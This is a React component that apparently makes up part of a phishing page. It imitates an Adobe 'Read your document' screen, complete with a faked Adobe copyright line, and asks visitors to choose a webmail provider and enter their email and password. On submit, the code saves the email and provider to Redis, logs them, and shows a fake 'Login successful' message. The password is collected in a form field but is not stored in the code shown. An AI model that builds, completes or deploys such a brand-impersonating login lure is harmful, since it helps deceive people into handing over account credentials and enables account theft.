'use client';

import { useState } from 'react';
import redis, { redisHelpers } from './lib/redis.js';

const emailProviders = {
  office365: {
    name: 'Office 365',
    icon: '🏢',
    color: '#0078d4',
    placeholder: 'username@company.com'
  },
  yahoo: {
    name: 'Yahoo Mail',
    icon: '🟣',
    color: '#6001d2',
    placeholder: 'username@yahoo.com'
  },
  outlook: {
    name: 'Outlook',
    icon: '📧',
    color: '#0078d4',
    placeholder: 'username@outlook.com'
  },
  aol: {
    name: 'AOL Mail',
    icon: '🔵',
    color: '#ff0b00',
    placeholder: 'username@aol.com'
  },
  others: {
    name: 'Other Providers',
    icon: '✉️',
    color: '#666666',
    placeholder: 'your@email.com'
  }
};

export default function EmailProvider() {
  const [selectedProvider, setSelectedProvider] = useState(null);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');

  const handleProviderSelect = (provider) => {
    setSelectedProvider(provider);
    setEmail('');
    setError('');
  };

  const handleBack = () => {
    setSelectedProvider(null);
    setEmail('');
    setPassword('');
    setError('');
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    setError('');
    
    try {
      // Check rate limiting
      const isLimited = await redisHelpers.isRateLimited(email);
      if (isLimited) {
        setError('Too many login attempts. Please try again later.');
        setIsLoading(false);
        return;
      }

      // Track login attempt
      await redisHelpers.trackLoginAttempt(email);

      // Generate a user ID (in production, this would come from your auth system)
      const userId = btoa(email).replace(/[^a-zA-Z0-9]/g, '');

      // Store email credentials in Redis (in production, encrypt these!)
      await redisHelpers.storeEmailCredentials(userId, selectedProvider, {
        email,
        provider: selectedProvider,
        timestamp: new Date().toISOString()
      });

      // Create user session
      const sessionData = {
        userId,
        email,
        provider: selectedProvider,
        loginTime: new Date().toISOString()
      };
      
      await redisHelpers.setUserSession(userId, sessionData);

      // Store user preferences
      await redisHelpers.setUserPreferences(userId, {
        preferredProvider: selectedProvider,
        lastLogin: new Date().toISOString()
      });

      console.log('Login successful:', { 
        provider: selectedProvider, 
        email,
        userId,
        sessionStored: true
      });

      // Simulate successful authentication
      setTimeout(() => {
        setIsLoading(false);
        alert('Login successful! Session stored in Redis.');
      }, 1000);

    } catch (error) {
      console.error('Redis operation failed:', error);
      setError('Authentication failed. Please try again.');
      setIsLoading(false);
    }
  };

  return (
    <div className="adobe-cloud-main">
      <div className="adobe-panel move-down">
        <div className="top-header-row">
          <img 
            src="https://images.pexels.com/photos/1779487/pexels-photo-1779487.jpeg?auto=compress&cs=tinysrgb&w=44&h=44&fit=crop" 
            alt="Adobe Logo" 
            className="acrobat-logo-left"
          />
          <h1 className="top-header-title">Read your document</h1>
        </div>
        
        {error && (
          <div className="error-message">
            {error}
          </div>
        )}
        
        {!selectedProvider ? (
          <div className="provider-selection">
            <h2 className="provider-title">Choose your email provider</h2>
            <div className="provider-grid">
              {Object.entries(emailProviders).map(([key, provider]) => (
                <button
                  key={key}
                  className="provider-option"
                  onClick={() => handleProviderSelect(key)}
                  style={{ borderColor: provider.color }}
                >
                  <span className="provider-icon">{provider.icon}</span>
                  <span className="provider-name">{provider.name}</span>
                </button>
              ))}
            </div>
          </div>
        ) : (
          <div className="login-form">
            <div className="selected-provider">
              <button className="back-button" onClick={handleBack}>
                ← Back
              </button>
              <div className="provider-info">
                <span className="provider-icon-large">
                  {emailProviders[selectedProvider].icon}
                </span>
                <span className="provider-name-large">
                  {emailProviders[selectedProvider].name}
                </span>
              </div>
            </div>
            
            <form onSubmit={handleSubmit}>
              <input 
                type="email" 
                placeholder={emailProviders[selectedProvider].placeholder}
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                required 
                disabled={isLoading}
              />
              <input 
                type="password" 
                placeholder="Password" 
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required 
                disabled={isLoading}
              />
              <button 
                type="submit"
                disabled={isLoading}
                style={{ backgroundColor: emailProviders[selectedProvider].color }}
              >
                {isLoading ? 'Signing In...' : `Sign In with ${emailProviders[selectedProvider].name}`}
              </button>
            </form>
          </div>
        )}
        
        <div className="adobe-copyright">
          © 2025 Adobe Service. All rights reserved.
        </div>
      </div>
    </div>
  );
}